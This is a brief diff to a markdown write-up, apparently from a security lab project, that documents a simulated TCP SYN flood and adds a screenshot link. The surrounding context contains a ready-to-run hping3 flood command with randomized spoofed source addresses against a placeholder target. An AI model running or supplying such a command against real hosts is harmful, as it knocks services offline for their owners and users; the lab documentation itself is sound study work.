@@ -109,6 +109,7 @@ A **Denial-of-Service (DoS)** attack was simulated using a TCP SYN Flood.
 ```bash
 sudo hping3 -S --flood --rand-source <Target_IP> -p 80
 ```
+<img width="1734" height="852" alt="Image" src="https://github.com/user-attachments/assets/a418ee84-2a71-420d-bad2-78ba2f642b63" />
 
 ---
 
